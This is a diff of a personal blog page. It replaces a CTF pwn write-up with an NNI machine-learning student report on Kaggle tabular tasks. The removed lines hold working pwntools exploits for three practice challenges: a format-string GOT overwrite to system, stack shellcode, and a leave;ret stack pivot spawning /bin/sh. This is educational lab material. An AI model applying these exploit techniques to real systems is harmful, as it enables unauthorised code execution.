@@ -21,20 +21,19 @@
     var CONFIG = {"hostname":"121.36.2.124","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="axb_2019_fmt3232位格式化字符串漏洞，有几个特点需要注意：  测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。 用格式化字符串漏洞泄露libc的时候用%s，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。 fmtstr_payload填了四个参数，其中注意numbwritten参数，意思是格式化字符串中前面已有的">
+  <meta name="description" content="Task 3.2 进阶任务实验报告Task 3.2.1 表格型数据的进阶任务电影票房预测：TMDB Box Office Prediction原始特征poster-path、imdb-id特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。 revenue和budget的分布比较不均匀，可以通过np.log1p进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。 cas">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Writeup for Second Week">
-<meta property="og:url" content="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/index.html">
+<meta property="og:title" content="NNI Student Program Task3.2">
+<meta property="og:url" content="https://121.36.2.124/2021/03/01/NNI-Student-Program-Task3-2/index.html">
 <meta property="og:site_name" content="Garen Wang&#39;s Blog">
-<meta property="og:description" content="axb_2019_fmt3232位格式化字符串漏洞，有几个特点需要注意：  测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。 用格式化字符串漏洞泄露libc的时候用%s，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。 fmtstr_payload填了四个参数，其中注意numbwritten参数，意思是格式化字符串中前面已有的">
+<meta property="og:description" content="Task 3.2 进阶任务实验报告Task 3.2.1 表格型数据的进阶任务电影票房预测：TMDB Box Office Prediction原始特征poster-path、imdb-id特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。 revenue和budget的分布比较不均匀，可以通过np.log1p进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。 cas">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-01-22T03:11:17.000Z">
-<meta property="article:modified_time" content="2021-01-23T15:05:32.633Z">
+<meta property="article:published_time" content="2021-03-01T14:09:27.000Z">
+<meta property="article:modified_time" content="2021-03-01T15:45:39.060Z">
 <meta property="article:author" content="Garen Wang">
-<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/">
+<link rel="canonical" href="https://121.36.2.124/2021/03/01/NNI-Student-Program-Task3-2/">
 
 
 <script id="page-configurations">
@@ -47,7 +46,7 @@
   };
 </script>
 
-  <title>Writeup for Second Week | Garen Wang's Blog</title>
+  <title>NNI Student Program Task3.2 | Garen Wang's Blog</title>
   
 
 
@@ -185,7 +184,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/01/NNI-Student-Program-Task3-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -198,7 +197,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Writeup for Second Week
+          NNI Student Program Task3.2
         </h1>
 
         <div class="post-meta">
@@ -207,19 +206,13 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2021-01-22 11:11:17" itemprop="dateCreated datePublished" datetime="2021-01-22T11:11:17+08:00">2021-01-22</time>
+              <time title="Created: 2021-03-01 22:09:27 / Modified: 23:45:39" itemprop="dateCreated datePublished" datetime="2021-03-01T22:09:27+08:00">2021-03-01</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-23 23:05:32" itemprop="dateModified" datetime="2021-01-23T23:05:32+08:00">2021-01-23</time>
-              </span>
 
           
-            <span id="/2021/01/22/Writeup-for-Second-Week/" class="post-meta-item leancloud_visitors" data-flag-title="Writeup for Second Week" title="Views">
+            <span id="/2021/03/01/NNI-Student-Program-Task3-2/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program Task3.2" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -234,8 +227,8 @@
       </span>
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2021/01/22/Writeup-for-Second-Week/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/22/Writeup-for-Second-Week/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/03/01/NNI-Student-Program-Task3-2/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/01/NNI-Student-Program-Task3-2/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -250,23 +243,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
-<ol>
-<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
-<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
-<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
-<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
-<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
-<p>直接粘核心exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
-<p>这个payload的构造挺巧妙的，稍微分析下：</p>
-<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>
-
+        <h1 id="Task-3-2-进阶任务实验报告"><a href="#Task-3-2-进阶任务实验报告" class="headerlink" title="Task 3.2 进阶任务实验报告"></a>Task 3.2 进阶任务实验报告</h1><h2 id="Task-3-2-1-表格型数据的进阶任务"><a href="#Task-3-2-1-表格型数据的进阶任务" class="headerlink" title="Task 3.2.1 表格型数据的进阶任务"></a>Task 3.2.1 表格型数据的进阶任务</h2><h3 id="电影票房预测：TMDB-Box-Office-Prediction"><a href="#电影票房预测：TMDB-Box-Office-Prediction" class="headerlink" title="电影票房预测：TMDB Box Office Prediction"></a>电影票房预测：TMDB Box Office Prediction</h3><h4 id="原始特征"><a href="#原始特征" class="headerlink" title="原始特征"></a>原始特征</h4><p>poster-path、imdb-id特征一个是图片链接，一个是id，对模型没有任何直接关系，直接删去。</p>
+<p>revenue和budget的分布比较不均匀，可以通过<code>np.log1p</code>进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。</p>
+<p>cast，crew，belongs-to-collection等特征是以json格式存储的，对数据中json的解析，<code>ast.literal_eval</code>能比较方便地完成解析任务。</p>
+<h4 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h4><h4 id="人工构造特征"><a href="#人工构造特征" class="headerlink" title="人工构造特征"></a>人工构造特征</h4><h4 id="自动特征工程"><a href="#自动特征工程" class="headerlink" title="自动特征工程"></a>自动特征工程</h4><h4 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h4><h3 id="旧金山犯罪分类：San-Francisco-Crime-Classification"><a href="#旧金山犯罪分类：San-Francisco-Crime-Classification" class="headerlink" title="旧金山犯罪分类：San Francisco Crime Classification"></a>旧金山犯罪分类：San Francisco Crime Classification</h3><h4 id="原始特征-1"><a href="#原始特征-1" class="headerlink" title="原始特征"></a>原始特征</h4><h4 id="特征处理-1"><a href="#特征处理-1" class="headerlink" title="特征处理"></a>特征处理</h4><h4 id="人工构造特征-1"><a href="#人工构造特征-1" class="headerlink" title="人工构造特征"></a>人工构造特征</h4><p>对时间序列特征，提取出年、月、日、季度，星期等子特征。并使用onehot编码展开。</p>
+<p>经纬度坐标中，在测试集发现经度为-120.5，纬度为90的异常特征，分别使用经纬度的中位数进行填补。</p>
+<p>发现地址中具有规律，可根据地址最后两个字母的不同，构造特征。</p>
+<p>使用随机森林进行回归，准确率为27.5%左右，有待提高。</p>
+<h4 id="使用NNI"><a href="#使用NNI" class="headerlink" title="使用NNI"></a>使用NNI</h4><h4 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h4><p>使用LightGBM算法，在验证集上的结果是2.35，达到了top25%左右的水平。</p>
+<p>在测试集上的结果是</p>
+<h3 id="土壤属性预测：Africa-Soil-Property-Prediction-Challenge"><a href="#土壤属性预测：Africa-Soil-Property-Prediction-Challenge" class="headerlink" title="土壤属性预测：Africa Soil Property Prediction Challenge"></a>土壤属性预测：Africa Soil Property Prediction Challenge</h3><p>multi-label的回归任务其实可以拆分为多个单label的回归任务，通过多次构建模型进行回归来预测各个label的值。</p>
+<h4 id="原始特征-2"><a href="#原始特征-2" class="headerlink" title="原始特征"></a>原始特征</h4><p>原始特征均进行过标准化处理，除了<code>Depth</code>特征可以将字符串变化为01编码，其他特征无需进一步处理。</p>
+<h4 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h4><p>使用了sklearn中贝叶斯线性回归模型（BayesianRidge），最终loss为0.46489，拟合效果很好。</p>
+<h2 id="Task-3-2-2-复杂型数据的探究任务"><a href="#Task-3-2-2-复杂型数据的探究任务" class="headerlink" title="Task 3.2.2 复杂型数据的探究任务"></a>Task 3.2.2 复杂型数据的探究任务</h2>
     </div>
 
     
@@ -274,10 +263,6 @@
     
 
       <footer class="post-footer">
-          
-          <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
-          </div>
 
         
 
@@ -285,13 +270,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/01/17/CSAPP-Attack-Lab-Writeup/" rel="prev" title="CSAPP Attack Lab Writeup">
-      <i class="fa fa-chevron-left"></i> CSAPP Attack Lab Writeup
+    <a href="/2021/03/01/DARTS-Learning-Note/" rel="prev" title="DARTS Learning Note">
+      <i class="fa fa-chevron-left"></i> DARTS Learning Note
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/01/23/NNI-Exploration-Learning-Notes/" rel="next" title="NNI Exploration Learning Notes">
-      NNI Exploration Learning Notes <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -351,7 +333,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#axb-2019-fmt32"><span class="nav-number">1.</span> <span class="nav-text">axb_2019_fmt32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-pz-hackover-2016"><span class="nav-number">2.</span> <span class="nav-text">ez_pz_hackover_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-number">3.</span> <span class="nav-text">ciscn_2019_es_2</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Task-3-2-%E8%BF%9B%E9%98%B6%E4%BB%BB%E5%8A%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A"><span class="nav-number">1.</span> <span class="nav-text">Task 3.2 进阶任务实验报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-3-2-1-%E8%A1%A8%E6%A0%BC%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E8%BF%9B%E9%98%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.1.</span> <span class="nav-text">Task 3.2.1 表格型数据的进阶任务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%B5%E5%BD%B1%E7%A5%A8%E6%88%BF%E9%A2%84%E6%B5%8B%EF%BC%9ATMDB-Box-Office-Prediction"><span class="nav-number">1.1.1.</span> <span class="nav-text">电影票房预测：TMDB Box Office Prediction</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%A7%8B%E7%89%B9%E5%BE%81"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">原始特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E5%BE%81%E5%A4%84%E7%90%86"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">特征处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%BA%E5%B7%A5%E6%9E%84%E9%80%A0%E7%89%B9%E5%BE%81"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">人工构造特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E7%89%B9%E5%BE%81%E5%B7%A5%E7%A8%8B"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">自动特征工程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C"><span class="nav-number">1.1.1.5.</span> <span class="nav-text">最终结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A7%E9%87%91%E5%B1%B1%E7%8A%AF%E7%BD%AA%E5%88%86%E7%B1%BB%EF%BC%9ASan-Francisco-Crime-Classification"><span class="nav-number">1.1.2.</span> <span class="nav-text">旧金山犯罪分类：San Francisco Crime Classification</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%A7%8B%E7%89%B9%E5%BE%81-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">原始特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E5%BE%81%E5%A4%84%E7%90%86-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">特征处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%BA%E5%B7%A5%E6%9E%84%E9%80%A0%E7%89%B9%E5%BE%81-1"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">人工构造特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8NNI"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">使用NNI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C-1"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">最终结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%9F%E5%A3%A4%E5%B1%9E%E6%80%A7%E9%A2%84%E6%B5%8B%EF%BC%9AAfrica-Soil-Property-Prediction-Challenge"><span class="nav-number">1.1.3.</span> <span class="nav-text">土壤属性预测：Africa Soil Property Prediction Challenge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E5%A7%8B%E7%89%B9%E5%BE%81-2"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">原始特征</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E6%A8%A1%E5%9E%8B"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">建立模型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-3-2-2-%E5%A4%8D%E6%9D%82%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8E%A2%E7%A9%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.2.</span> <span class="nav-text">Task 3.2.2 复杂型数据的探究任务</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
